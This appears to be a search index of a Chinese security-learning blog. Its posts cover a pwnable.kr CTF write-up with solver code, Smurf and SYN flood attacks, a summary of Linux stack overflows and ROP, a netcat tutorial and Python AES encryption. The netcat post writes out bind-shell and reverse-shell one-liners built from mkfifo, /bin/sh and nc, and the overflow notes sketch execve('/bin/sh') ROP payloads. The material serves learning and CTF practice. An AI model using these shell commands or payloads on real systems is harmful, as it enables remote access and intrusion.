<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[pwnable.kr-input2]]></title>
    <url>%2F2018%2F12%2F17%2Fpwnable-kr-input2%2F</url>
    <content type="text"><![CDATA[审题&emsp;&emsp;又是ssh，连上去看看，存在input.c源文件，那么直接分析源文件。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#code:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf(&quot;Welcome to pwnable.kr\n&quot;); printf(&quot;Let&apos;s see if you know how to give input to program\n&quot;); printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;); // argv if(argc != 100) return 0; if(strcmp(argv[&apos;A&apos;],&quot;\x00&quot;)) return 0; if(strcmp(argv[&apos;B&apos;],&quot;\x20\x0a\x0d&quot;)) return 0; printf(&quot;Stage 1 clear!\n&quot;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0; printf(&quot;Stage 2 clear!\n&quot;); // env if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0; printf(&quot;Stage 3 clear!\n&quot;); // file FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0; fclose(fp); printf(&quot;Stage 4 clear!\n&quot;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf(&quot;socket error, tell admin\n&quot;); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv[&apos;C&apos;]) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf(&quot;bind error, use another port\n&quot;); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf(&quot;accept error, tell admin\n&quot;); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\n&quot;); // here&apos;s your flag system(&quot;/bin/cat flag&quot;); return 0;&#125; 分析&emsp;&emsp; 看了下没有溢出，看来只能正常运行程序得到flag，而想运行程序到最后需满足5个条件。 参数得100个，并且65为”\x00”,66为”\x20x0a\x0d”,67为端口号(自己定). stdin 和 stderr 得输入特定值 而特定值无法通过命令行输入得，这里我们可以通过进程间通信传。 env环境变量 “\xde\xad\xbe\xef=\xca\xfe\xba\xbe” 打开个”\x0a”文件，并读入4字节数据，满足为”\x00\x00\x00\x00”,可创建这个文件 创建了个服务器， 等待接受数据为”\xde\xad\xbe\xef”, 我们可创建客户端连接它，发送这个数据。SolvePwn–c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main()&#123; int *argv[101]=&#123;0&#125;; int pipe_stdin[2]=&#123;-1,-1&#125;,pipe_stderr[2]=&#123;-1,-1&#125;; int i; pid_t pid; FILE *fp=NULL; //env char *envp[2]=&#123;&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;,NULL&#125;; //argv for(i=0;i&lt;100;i++) argv[i]=&quot;a&quot;; argv[0]=&quot;/home/input2/input&quot;; argv[&apos;A&apos;]=&quot;\x00&quot;; argv[&apos;B&apos;]=&quot;\x20\x0a\x0d&quot;; argv[&apos;C&apos;]=&quot;33333&quot;; argv[100]=NULL; //file fp = fopen(&quot;\x0a&quot;,&quot;wb&quot;); if(!fp) &#123; printf(&quot;open file error&quot;); return 0; &#125; fwrite(&quot;\x00\x00\x00\x00&quot;,4,1,fp); fclose(fp); fp=NULL; //stdio if(pipe(pipe_stdin)&lt;0 || pipe(pipe_stderr)&lt;0) &#123; printf(&quot; pipe error&quot;); return 0; &#125; if((pid=fork())&lt;0) &#123; printf(&quot; fork error&quot;); return 0; &#125; if(pid == 0) &#123; sleep(1); close(pipe_stdin[0]); close(pipe_stderr[0]); write(pipe_stdin[1],&quot;\x00\x0a\x00\xff&quot;,4); write(pipe_stderr[1],&quot;\x00\x0a\x02\xff&quot;,4); &#125; else &#123; close(pipe_stdin[1]); close(pipe_stderr[1]); dup2(pipe_stdin[0],0); dup2(pipe_stderr[0],2); execve(argv[0],argv,envp); &#125; //network sleep(5); int sockfd; struct sockaddr_in saddr; sockfd = socket(AF_INET,SOCK_STREAM,0); if(sockfd == -1) &#123; printf(&quot; create socket error&quot;); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); saddr.sin_port = htons(33333); if(connect(sockfd, (struct sockaddr *)&amp;saddr,sizeof(saddr))&lt;0) &#123; printf(&quot; connect error&quot;); return 0; &#125; write(sockfd, &quot;\xde\xad\xbe\xef&quot;,4); close(sockfd); return 0;&#125; Pwn–python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#coding: utf-8import subprocessimport osimport socketimport timepayload = []payload.append(&apos;/home/input2/input&apos;)for i in range(64): payload.append(&apos;a&apos;)payload.append(&apos;&apos;)payload.append(&apos; \n\r&apos;)payload.append(&apos;9999&apos;)for i in range(32): payload.append(&apos;a&apos;)stdinr, stdinw = os.pipe()stderrr, stderrw = os.pipe()os.write(stdinw,&apos;\x00\x0a\x00\xff&apos;)os.write(stderrw,&apos;\x00\x0a\x02\xff&apos;)environ = &#123;&apos;\xde\xad\xbe\xef&apos; : &apos;\xca\xfe\xba\xbe&apos; &#125;f = open(&apos;\n&apos;,&apos;wb&apos;)f.write(&apos;\x00&apos;*4)f.close()s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print subprocess.Popen(payload,stdin = stdinr , stderr = stderrr , env = environ)time.sleep(2)try: s.connect((&apos;127.0.0.1&apos;,9999))except: print(&quot;fail&quot;) exit(1)s.send(&apos;\xde\xad\xbe\xef&apos;)data = s.recv(2048)print(data)s.close()]]></content>
  </entry>
  <entry>
    <title><![CDATA[O协议攻击]]></title>
    <url>%2F2018%2F11%2F16%2F%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[Smurf攻击： 发送伪装的ICMP数据包，目的地址设为某个网络的广播地址，源地址设为要攻击的目的主机，使所有收到此ICMP数据包的主机都将对目的主机发出一个回应，使被攻击主机在某一段时间内收到 成千上万的数据包]]></content>
  </entry>
  <entry>
    <title><![CDATA[网络协议之TCP]]></title>
    <url>%2F2018%2F11%2F16%2F%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[TCPtcp 特性 tcp提供一种面向连接的，可靠的字节流服务。仅两方通信，不能用于广播和多播。 tcp使用校验和，确认和重传来保证可靠传输 tcp使用滑动窗口来实现流量控制，动态改变窗口大小来进行拥塞控制tcp 三次握手1.客户端发送 （SYN=1,seq=x）的包，进入SYN_SEND状态。 2.服务器返回（SYN=1,seq=y，ACK=1,ACKnum=x+1），进入SYN_RCVD状态。3.客户端发送（ACK=1,ACKnum=y+1)，进入ESTABLISHED状态，服务器收到这个包，也进入ESTABLISHED状态。总结起来就是，a:你听得到我吗？ b: 我听得到，你听得到我吗？ a：我听得到你 之后开始balabala。。。注意： 第一个包，a发送包后，没有收到b的确认（二次握手包），则会周期性超时重传，直到收到b确认，当然我们客户端可以手动结束。 第二个包，若b发给a的SYN+ACK包，没有得到a的回复，则b会周期性超时重传，直到收到a的确认。 这个阶段可以构成SYN攻击，即a只发送大量的SYN包，造成b（服务器）周期性回复确认包，消耗服务器资源，构成Dos/DDos攻击。检测：netstat -n -p TCP | grep SYN_RECV 防御：1.缩短超时（SYN Timeout）时间,2.增加最大半连接数, 3.过滤网关防护, 4.SYN cookies技术tcp 四次挥手1.客户端发送（FIN=1,seq=x）表示想关闭连接，成功后进入FIN_WAIT_1状态。2.服务器发送（ACK=1,ACKnum=x+1）表示接受到了客户端请求，服务器进入CLOSE_WAIT状态，客户端接受到这个包后，进入FIN_WAIT_2，等待服务器关闭连接。3.服务器发送（FIN=1,seq=y）准备关闭连接，进入LAST_ACK状态。4.客户端发送（ACK=1,ACKnum=y+1)确认包，进入TIME_WAIT，等待可能出现的重传ACK包，服务器收到后进入CLOSED状态，客户端等某个固定时间（2MSL），没收到重传ACK，认为服务器已经关闭连接，客户端关闭连接，进入CLOSED状态。]]></content>
  </entry>
  <entry>
    <title><![CDATA[linux 栈溢出总结]]></title>
    <url>%2F2018%2F10%2F31%2Flinux-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[进程中内存分段Linux使用虚拟地址空间，每个进程有独立的虚拟地址空间，进程访问的虚拟地址并不是真正的物理地址,这大大增加了进程的寻址空间。由低地址到高地址如下: .text .data .bss 堆–&gt; 未使用与共享库 &lt;–栈 内核 代码段 数据段 未初始化变量 malloc .so 函数使用 用户不可见 栈简介&emsp;&emsp;栈是一种数据结构，是一种具有先进后出性质的队列,由内存高地址向低地址逆向增长，汇编中用push将数据添加到栈，pop从栈中取数据。每个进程都在内存.stack段维持自身栈，与栈相关有两个寄存器：ebp，esp。而函数调用栈是我们栈溢出基础。 函数调用栈 c函数调用栈1 c函数调用栈232位和64位程序在参数保存上有所区别， x86: 参数在eip上方，即栈上。 x64: 前6个参数依次保存在RDI,RSI,RDX,RCX,R8,R9寄存器中，如果多余6个则保存在栈上。 栈溢出原理&emsp;&emsp;程序向栈中某个变量写入字节数超过了变量自己申请的字节数，导致相邻栈中变量值改变，这种称为缓冲区溢出。这种漏洞可使程序崩溃(DOS),还可能让我们控制程序流程(getshell）所以栈溢出前提: 程序能向栈上写数据 写入数据大小未能良好控制 linux下栈保护 cannary（在栈中插入cookie信息，函数返回时验证） FORTIFY (FORTIFY_SOURCE机制对字符串有两个限制 1.包含%n的格式化字符串不能位于程序内存可写位置。2.当使用位置参数时，必须使用范围内的所有参数。即用%6$x,得同时用1,2,3,4,5。 NX（no-execute,堆栈不可执行),(.bss只有对写权限） RELRO (full RELRO, Partial RELRO)（FR设置符号重定向为只读，减少GOT攻击) ALSR 地址空间布局随机化，只有在开启 ASLR 之后，PIE 才会生效 0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化2是增强的ASLR，增加了堆随机化 PIE叫做代码部分地址无关，PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。如果不开启PIE的话，那么每次ELF文件加载的地址都是相同的。将端口绑定到程序，模仿远程服务器开启服务：1socat TCP4-LISTEN:9999,fork EXEC:./meet 栈保护绕过ROP(返回导向编程)&emsp;&emsp;Bypass NX and ASLR(程序执行时会使libc.so地址变化)寻找控制寄存器的gdagets：ropgadgets–&gt;$ROPgadget –binary b0verfl0w –only ‘jmp|ret’.text(可用函数）/.bss(写入shellcode再执行它) rop调用系统调用,eg:execve(“/bin/sh”,NULL,NULL)1payload = &apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80 NX绕过&emsp;&emsp;Ret2libc–&gt;将eip的值覆盖为libc.so(共享库）的system地址，使执行system(“/bin/sh”)ALSR绕过 libc已知：libc.so函数偏移地址固定，所以泄露某一地址，就可以得到其余地址，一般采用got表泄漏,当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址. libc未知：通过内存泄漏，eg：pwnlib.dynelf, 泄漏函数：puts,write,printf stack pivoting:劫持栈指针指向攻击者控制的内存(堆,栈，.bss)然后rop 1eg: shellcode|padding|fake ebp|jmp esp|set esp to shellcode jmp esp (sub esp,size jmp esp) frame faking:同时控制eip和ebp，改变程序栈帧。payload: 执行两次 leave ret 到达我们伪造的栈帧 1padding | fake ebp|leave ret addr 函数入口： push ebp mov ebp,esp 函数出口： leave–&gt; mov esp,ebp pop ebp || ret—&gt; pop eip伪造栈1fake ebp --&gt; ebp2| target function addr| leave ret addr| arg1|arg2 stack smash当canary被修改，程序执行stack_chk_fail 打印 argv[0]指向的字符串（程序名)劫持 stack_chk_fail的 got 值劫持流程getshell，或泄露内存 partial overwrite:由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的 绕过canarycanary实现12345678函数序言时：mov rax, qword ptr fs:[0x28] 向rbp-8插入canarymov qword ptr [rbp - 8], rax函数返回前： 检测cannary是否被修改mov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串,溢出泄露canary，并打印。 可以通过劫持 stack_chk_fail的 got 值劫持流程或者利用 stack_chk_fail 泄漏内容fs寄存器指向TLS结构（线程局部存储) fs:0x28指向结构中的stack_guard BROP]]></content>
  </entry>
  <entry>
    <title><![CDATA[nc———网络瑞士军刀]]></title>
    <url>%2F2018%2F10%2F28%2Fnc%E2%80%94%E7%BD%91%E7%BB%9C%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;netcat，瑞士军刀，通过tcp和udp在网络读写数据。能和其他工具或脚本结合使用，做出amazing thing！！你可以通过它做服务器，聊天，传输、下载数据等等。。下面学习一些实例： 1.聊天Server—listening1nc -l 9999 Client—connect1nc 127.0.0.1 9999 默认nc会在9999开启一个tcp服务器，输出与输入都在此shell，所以不太友好。。。 2.文件传输传输小文件时，方便快捷。12Server:nc -l 9999 &lt; file1.txt 或 &gt; file2.txt 12Client:nc -n 127.0.0.1 9999 &gt; file1.txt 或 &lt; file2.txt 这里服务器即可发送文件，也能接受文件，不用再将文件源做服务器，‘&gt;’是shell里的重定向，玩linux应该都知道。。。 目录传输传输目录也就是打包，压缩文件(可选）12Server:tar -cvf - dirname | bzip2 -z | nc -l 9999 12Client:nc -n 127.0.0.1 9999 | bzip2 -d | tar -xvf - 3.克隆设备将配置好的linux机器重复同样操作对其他机器,骚操作。。。12Server:dd if=/dve/sda | nc -l 9999 12Client:nc -n 127.0.0.2 | dd of=/dev/sda 4.打开shell正向shell客户端得到服务器shell12Server:nc -l 9999 -e /bin/bash -i 不过 -e 好像不好使了。。。不过可以这样123Client:mkfifo /tmp/tmpfifocat /tmp/tmpfifo | /bin/sh -i 2&gt;&amp;1 | nc -l 9999 &gt; /tmp/tmpfifo linux下进程间通信必须通过内核提供的通道，而命名管道fifo文件就是其中之一。从网络收到的输入写到fifo文件中cat 命令读取fifo文件并且其内容发送给sh命令sh命令进程受到输入并把它写回到netcat。netcat 通过网络发送输出到client 至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。12Client:nc -n 127.0.0.1 9999 反向shell服务器得到客户端shell12Server:nc -l 9999 12Client:cat /tmp/tmpfifo | /bin/sh -i 2&gt;&amp;1 | nc -n 127.0.0.1 9999 &gt; /tmp/tmpfifo 指定客户端端口，用 -p port 5.指定源地址假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。用-s制定 ip12Servernc -u -l 9999 &lt;file.txt 12Clientnc -u 127.0.0.1 9999 -s 196.168.1.3 &gt; file.txt 参考文章:以上内容主要来自这里:https://www.oschina.net/translate/linux-netcat-command]]></content>
  </entry>
  <entry>
    <title><![CDATA[学习 python3 AES]]></title>
    <url>%2F2018%2F10%2F28%2F%E5%AD%A6%E4%B9%A0-python3-AES%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近学着堆溢出的各种花式操作时，头快炸了。因此想换个知识过渡一下，一直对木马和病毒有兴趣，想了解具体的实现。今天写木马时遇到了加密的问题，记录一下。 AES简介&emsp;&emsp;AES: Advanced Encryption Standard(高级加密标准),在密码学中又称Rijndael加密法,该算法由比利时密码学家Joan Daemen和Vincent Rijmen所设计，是对称密钥加密中最流行的算法之一。 AES有5种加密操作模式： 电码本模式（Electronic Codebook Book (ECB)）密码分组链接模式（Cipher Block Chaining (CBC)）计算器模式（Counter (CTR)）密码反馈模式（Cipher FeedBack (CFB)）输出反馈模式（Output FeedBack (OFB)） 常见算法说明1.摘要算法&emsp;&emsp;代表：MD5，SHA1。摘要算法是一个不可逆过程&emsp;&emsp;用途：验证消息完整性，安全访问认证，数字签名。 2.对称加密算法&emsp;&emsp;代表：AES，DES。对称加密算法是为了区分非对称加密。&emsp;&emsp;特点：加解密同一密钥，与非对称密钥不一样（有公钥和私钥）&emsp;&emsp;用途：对大型数据加密，加密速度快。 3.非对称加密算法&emsp;&emsp;代表：RSA，Elgamal。非对称加密体系不要求通信双方事先传递密钥或有任何约定就能完成保密通信。&emsp;&emsp;特点：安全性强，密钥管理方便。 4.总结&emsp;&emsp;一般一次数据的传输是几种加密算法的结合，确保数据完整，安全，保密。&emsp;&emsp;先简要了解各种算法，以后再深入了解相关数学原理和破解原理实现，毕竟咱是要走hack路线的。。。 python AES 实现&emsp;&emsp;python中已经有实现AES算法的库了——pycrypto，非标准库，需安装。1pip install pycrypto &emsp;&emsp;python AES中CBC模式的实现，仅适用python3.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/python3#coding:UTF-8#############################File Name:aes1.py#Author: shishen#Mail: shishenwozuile@gmail.com#Created Time: 2017-10-27 22:22:43############################from Crypto.Cipher import AESfrom Crypto import Randomimport base64import sys#padding 算法，填充作用SZ = AES.block_size # AES数据分组为128bit，即16字节pad = lambda s: s + (SZ - len(s.encode('utf-8')) % SZ) *chr(0)class aes: def __init__(self, key, mode): #加密时使用的key，16（AES-128）、24（AES-192）、或32（AES-256） self.key = key self.mode = mode #加密模式 def encrypt(self, text): #生成随机初始向量IV iv = Random.new().read(SZ) #生成指定mode加密算法对象 cryptor = AES.new(self.key, self.mode, iv) cryptext = cryptor.encrypt(pad(text)) #加密 #将密文进行编码，便于传输,decode去掉b return base64.b64encode(iv + cryptext).decode('utf-8') def decrypt(self, cryptext): cryptext = base64.b64decode(cryptext.encode('utf-8')) #解码 iv = cryptext[0:SZ] cryptext = cryptext[SZ:len(cryptext)] #密文 cryptor = AES.new(self.key, self.mode, iv) text = cryptor.decrypt(cryptext).decode('utf-8') #解密 return text.rstrip(chr(0))def main(): ed = aes(b'iamthehellowolrd', AES.MODE_CBC) CBC模式 #argv[1] 需要加密的明文 e = ed.encrypt(sys.argv[1]) d = ed.decrypt(e) print("加密： ",e) print("解密： ",d)if __name__ == '__main__': main() &emsp;&emsp;强调一下AES是对称加密算法，加解密的密钥相同,我们来看一下运行结果123pi@raspberrypi:~/python11/AES $ python3 aes1.py &quot;你好啊，世界！I aM&quot;加密： 3ILPw0i+V2hGadHBq883r/N3bY9MZGyBTpGq+oRRNu5GOmxY1NY+BJSxeOewugNk解密： 你好啊，世界！I aM &emsp;&emsp;这里还要说一下base64，base64不是加密算法，而是一种编码算法。那么为什么用base64呢？&emsp;&emsp; Base64是一种基于64个可打印字符来表示二进制的表示方法，一般用于网络传输,为了支持某些只识别ascii字符的系统。并且有些协议和设备不支持不可见字符传输(产生冲突，错误)，只能传输可打印字符(在ASCII码中规定，0~31、128这33个字符属于控制字符，32~127这95个字符属于可打印字符)，而base64可将不可见字符转换为可见字符，用于传输。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F10%2F21%2Fhello-world%2F</url>
    <content type="text"><![CDATA[你好啊，李银河！当我跨过沉沦的一切，向着永恒开战的时候，你是我的军旗。——王小波]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
</search>
